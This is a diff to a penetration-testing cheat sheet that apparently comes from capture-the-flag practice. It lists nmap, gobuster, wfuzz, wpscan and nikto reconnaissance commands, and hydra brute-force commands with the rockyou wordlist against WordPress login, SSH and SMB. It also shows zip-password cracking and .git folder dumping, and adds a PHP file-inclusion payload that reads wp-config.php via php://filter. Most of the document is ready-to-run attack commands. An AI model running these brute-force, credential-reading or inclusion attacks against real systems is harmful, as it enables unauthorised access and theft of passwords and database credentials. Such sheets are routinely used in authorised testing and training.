@@ -9,17 +9,17 @@
 ### Basic Scan
 
 * Agressive scan - Will perform OS detection and version detection
-    * `nmap -A -oN nmap.txt $IP`
+    * `nmap -A -oN nmap.txt target`
 * Run vulnerabilities scripts
-    * `nmap -script vuln -oN nmapVuln.txt $IP`
+    * `nmap -script vuln -oN nmapVuln.txt target`
 * Scann all the ports
-    * `nmap -A -p- -oN nmapFull.txt $IP`
+    * `nmap -A -p- -oN nmapFull.txt target`
 
 ### Enumerate Web Site Folders
 
-* `gobuster dir -e -u http://$IP/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt`
-* `gobuster dir -e -u http://$IP/ -t30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  | tee gobuster2.txt`
-* `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 54 -t10 "$IP/FUZZ"`
+* `gobuster dir -e -u http://target/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt`
+* `gobuster dir -e -u http://target/ -t30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  | tee gobuster2.txt`
+* `wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 54 -t10 "target/FUZZ"`
 
 ### Find SubDomains
 * `wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 290 -H "Host:FUZZ.somedomain.com" "http://somedomain.com/"`
@@ -32,15 +32,15 @@
 
 ### Enumerate Mounts
 * `nmap -p PORT --script=nfs-ls,nfs-statfs,nfs-showmount -oN nmapRpc.txt IP`
-    * To mount: `sudo mount -t nfs $IP:$SOURCE_PATH $DESTINATION_PATH`
-* `showmount -e $IP`
+    * To mount: `sudo mount -t nfs target:$SOURCE_PATH $DESTINATION_PATH`
+* `showmount -e target`
 
 ### Enumerate Wordpress Site
-* Get users: `wpscan --url $URL -e vp,u`
+* Get users: `wpscan --url http://target/ -e vp,u`
 
 ### Web Site Scan
 
-* nikto: `nikto -h $URL`
+* nikto: `nikto -h http://target/`
 
 
 ## Brute Forcing
@@ -51,14 +51,14 @@
 * Combine wordlists: `/usr/lib/hashcat-utils/combinator.bin colors.txt numbers.txt > wordlist.txt`
 
 #### Wordpress
-* `hydra -l wade -P /usr/share/wordlists/rockyou.txt -u -f -t64 -m '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:S=Location' $URL http-post-form -v -e snr`
-* `wpscan --url $URL --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50`
+* `hydra -l wade -P /usr/share/wordlists/rockyou.txt -u -f -t64 -m '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:S=Location' http://target/ http-post-form -v -e snr`
+* `wpscan --url http://target/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50`
 
 ### SSH
-* `hydra -l root -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t32 $IP ssh`
+* `hydra -l root -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t32 target ssh`
 
 ### SMB
-`hydra -l fox -P /usr/share/wordlists/rockyou.txt -u -e snr $IP smb`
+`hydra -l fox -P /usr/share/wordlists/rockyou.txt -u -e snr target smb`
 
 ### Brute Force Zip File
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip 
@@ -83,3 +83,8 @@ git clone http://pwd.harder.local/.git/
 ./GitTools/Dumper/gitdumper.sh http://pwd.harder.local/.git/ gitFolder
 ./GitTools/Extractor/extractor.sh gitFolder/ gitExtracted
 ```
+
+## File Inclusion
+
+* Read a PHP file in base64 when include/require is used:
+	* http://somesite.com/?VulnerableParameter=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
